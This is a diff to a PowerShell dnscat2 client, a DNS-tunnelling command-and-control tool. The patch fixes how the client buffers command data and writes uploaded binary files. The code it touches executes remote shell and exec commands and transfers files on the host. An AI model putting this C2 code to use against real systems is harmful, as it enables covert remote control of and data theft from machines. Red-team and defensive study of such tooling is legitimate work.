@@ -1495,6 +1495,7 @@ function Start-Dnscat2Session ($SessionId, $Options, $Domain, $DNSServer, $DNSPo
         $Session["IsResponse"] = ""
         $Session["CommandId"] = ""
         $Session["CommandFields"] = ""
+        $Session["CommandFieldsBytes"] = @()
         $Session["CommandPacketBuffer"] = ""
         $Session["Tunnels"] = New-Object System.Collections.Hashtable
         $Session["DeadTunnels"] = @()
@@ -1624,12 +1625,14 @@ function Update-Dnscat2CommandSession ($Session) {
                 # length of remaining command packet is -ge remaining data buffer
                 # We can just grab the rest of the packet buffer
                 $Session["CommandFields"] += $Session["CommandPacketBuffer"]
+                $Session["CommandFieldsBytes"] += Convert-HexToBytes $Session["CommandPacketBuffer"]
                 $Session["RemainingBytes"] -= $Session["CommandPacketBuffer"].Length/2
                 $Session["CommandPacketBuffer"] = ""
             } else {
                 # length of remaining command packet is -lt remaining data buffer
                 # We have another packet header in the buffer!
                 $Session["CommandFields"] += $Session["CommandPacketBuffer"].Substring(0, $Session.RemainingBytes*2)
+                $Session["CommandFieldsBytes"] += Convert-HexToBytes $Session["CommandPacketBuffer"].Substring(0, $Session.RemainingBytes*2)
                 $RemainingBytes = $Session.RemainingBytes*2
                 $Session["RemainingBytes"] -= ($Session["CommandPacketBuffer"].Substring(0, $Session.RemainingBytes*2)).Length/2
                 $Session["CommandPacketBuffer"] = $Session["CommandPacketBuffer"].Substring($RemainingBytes)
@@ -1651,15 +1654,15 @@ function Update-Dnscat2CommandSession ($Session) {
         {
             "0000" # COMMAND_PING
             {
-                $PacketLengthField = ([Convert]::ToString((4 + $Session.CommandFields.Length/2),16)).PadLeft(8, '0')
-                $DriverData = ($PacketLengthField + $Session.PacketIdBF + "0000" + $Session.CommandFields)
+                $PacketLengthField = ([Convert]::ToString((4 + $Session["CommandFields"].Length/2),16)).PadLeft(8, '0')
+                $DriverData = ($PacketLengthField + $Session.PacketIdBF + "0000" + $Session["CommandFields"])
                 $Session["DriverDataQueue"] += $DriverData
                 return $Session
             }
             "0001" # COMMAND_SHELL
             {
                 try {
-                    $NewSessionName = $Session.CommandFields
+                    $NewSessionName = $Session["CommandFields"]
                     $NewSession = Start-Dnscat2Session (New-RandomDNSField 4) ("0001" + $NewSessionName) $Session.Domain $Session.DNSServer $Session.DNSPort $Session.MaxPacketSize $Session.Encryption $Session["EncryptionKeys"].PreSharedSecret $Session.LookupTypes $Session.Delay $Session.MaxRandomDelay "exec" "cmd"
                     $Session.NewSessions.Add($NewSession.SessionId, $NewSession)
                     $PacketLengthField = ([Convert]::ToString((4 + $NewSession.SessionId.Length/2),16)).PadLeft(8, '0')
@@ -1677,8 +1680,8 @@ function Update-Dnscat2CommandSession ($Session) {
             "0002" # COMMAND_EXEC
             {
                 try {
-                    $NewSessionName = $Session.CommandFields.Substring(0,$Session.CommandFields.IndexOf("00"))
-                    $NewSessionCommand = Convert-HexToString ($Session.CommandFields.Substring($Session.CommandFields.IndexOf("00") + 2).replace("00",""))
+                    $NewSessionName = $Session["CommandFields"].Substring(0,$Session["CommandFields"].IndexOf("00"))
+                    $NewSessionCommand = Convert-HexToString ($Session["CommandFields"].Substring($Session["CommandFields"].IndexOf("00") + 2).replace("00",""))
                     $NewSessionDriver = "exec"
                     
                     if ($NewSessionCommand -eq "psh") {
@@ -1703,7 +1706,7 @@ function Update-Dnscat2CommandSession ($Session) {
             "0003" # COMMAND_DOWNLOAD
             {
                 try {
-                    $FileName = Convert-HexToString $Session.CommandFields.TrimEnd('00')
+                    $FileName = Convert-HexToString $Session["CommandFields"].TrimEnd('00')
                     
                     if ($FileName.StartsWith("bytes:`$")) {
                         $Session["PSDownloadReady"] = $True
@@ -1728,7 +1731,7 @@ function Update-Dnscat2CommandSession ($Session) {
             "0004" # COMMAND_UPLOAD
             {
                 try {
-                    $Data = $Session['CommandFields']
+                    $Data = $Session["CommandFields"]
                     $FileName = Convert-HexToString ($Data[0..($Data.IndexOf('00') - 1)] -join '')
                     [String]$Data = (($Data[($Data.IndexOf('00') + 2)..$Data.Length]) -join '')
                     
@@ -1737,7 +1740,7 @@ function Update-Dnscat2CommandSession ($Session) {
                         $Session["PSUploadName"] = $FileName.Substring(5)
                         $Session["PSUploadValue"] = $Data
                     } else {
-                        [byte[]]$Bytes = Convert-HexToBytes $Data
+                        [byte[]]$Bytes = $Session['CommandFieldsBytes'][($FileName.Length+1)..$Session['CommandFieldsBytes'].Length]
                         [IO.File]::WriteAllBytes($FileName, $Bytes) 2>&1 | Out-Null
                     }
                     $DriverData = ("00000004" + $Session.PacketIdBF + $Session["CommandId"])
@@ -1753,7 +1756,7 @@ function Update-Dnscat2CommandSession ($Session) {
             "0006" # COMMAND_DELAY
             {
                 try {
-                    $Session["Delay"] = [Convert]::ToUInt32($Session.CommandFields, 16)
+                    $Session["Delay"] = [Convert]::ToUInt32($Session["CommandFields"], 16)
                     Write-Verbose ('New Delay: ' + $Session["Delay"].ToString())
                 } catch {}
                 
